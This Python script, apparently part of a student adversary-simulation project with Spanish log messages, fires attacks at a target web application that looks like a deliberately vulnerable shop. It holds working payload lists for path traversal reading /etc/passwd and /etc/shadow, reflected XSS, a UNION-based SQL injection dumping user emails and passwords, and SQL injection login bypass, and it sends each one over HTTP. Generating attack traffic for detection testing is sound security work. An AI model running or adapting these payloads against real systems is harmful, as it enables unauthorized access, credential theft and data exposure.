import datetime
import os
import sys
import time

import requests

REQUEST_TIMEOUT = 10
READINESS_TIMEOUT = 300
STABILIZATION_DELAY = 10
USER_AGENT = "tfg-adversary-simulator/1.0"

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "../../../../etc/passwd%00",
    "../../../../etc/shadow",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<iframe src=\"javascript:alert(`xss`)\">",
    "<img src=x onerror=alert('xss')>",
    "\"><svg/onload=alert('xss')>",
]

SQLI_SEARCH_PAYLOADS = [
    "'",
    "' OR 1=1--",
    "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--",
]

SQLI_LOGIN_PAYLOADS = [
    "' OR 1=1--",
    "admin' OR '1'='1",
    "' OR '1'='1'--",
    "'--",
]


def log(message):
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"[attack_simulator] {timestamp} {message}", flush=True)


def resolve_target():
    target = os.environ.get("TARGET_IP")
    if not target and len(sys.argv) > 1:
        target = sys.argv[1]
    if not target:
        log("ERROR: no se ha proporcionado la IP objetivo (TARGET_IP o argv[1])")
        sys.exit(1)
    return target.strip()


def wait_for_target(session, base_url):
    deadline = time.time() + READINESS_TIMEOUT
    while time.time() < deadline:
        try:
            response = session.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                return True
        except requests.exceptions.RequestException as exc:
            log(f"objetivo aun no disponible: {exc}")
        time.sleep(3)
    return False


def run_lfi(session, base_url):
    log("iniciando vector LFI / Path Traversal")
    for payload in LFI_PAYLOADS:
        try:
            response = session.get(
                f"{base_url}/",
                params={"file": payload},
                timeout=REQUEST_TIMEOUT,
            )
            log(f"LFI payload={payload!r} status={response.status_code}")
        except requests.exceptions.RequestException as exc:
            log(f"LFI payload={payload!r} error={exc}")


def run_xss(session, base_url):
    log("iniciando vector XSS reflejado")
    for payload in XSS_PAYLOADS:
        try:
            response = session.get(
                f"{base_url}/rest/products/search",
                params={"q": payload},
                timeout=REQUEST_TIMEOUT,
            )
            log(f"XSS payload={payload!r} status={response.status_code}")
        except requests.exceptions.RequestException as exc:
            log(f"XSS payload={payload!r} error={exc}")


def run_sqli(session, base_url):
    log("iniciando vector SQLi (search)")
    for payload in SQLI_SEARCH_PAYLOADS:
        try:
            response = session.get(
                f"{base_url}/rest/products/search",
                params={"q": payload},
                timeout=REQUEST_TIMEOUT,
            )
            log(f"SQLi-search payload={payload!r} status={response.status_code}")
        except requests.exceptions.RequestException as exc:
            log(f"SQLi-search payload={payload!r} error={exc}")

    log("iniciando vector SQLi (login bypass)")
    for payload in SQLI_LOGIN_PAYLOADS:
        try:
            response = session.post(
                f"{base_url}/rest/user/login",
                json={"email": payload, "password": "password123"},
                timeout=REQUEST_TIMEOUT,
            )
            log(f"SQLi-login payload={payload!r} status={response.status_code}")
        except requests.exceptions.RequestException as exc:
            log(f"SQLi-login payload={payload!r} error={exc}")


def main():
    target = resolve_target()
    base_url = f"http://{target}"
    log(f"objetivo establecido en {base_url}")

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    if not wait_for_target(session, base_url):
        log(f"ERROR: el objetivo {base_url} no respondio HTTP 200 en {READINESS_TIMEOUT}s")
        sys.exit(2)

    log(f"objetivo disponible; pausa de estabilizacion ({STABILIZATION_DELAY}s)")
    time.sleep(STABILIZATION_DELAY)

    run_lfi(session, base_url)
    run_xss(session, base_url)
    run_sqli(session, base_url)

    log("suite de ataque completada")


if __name__ == "__main__":
    main()
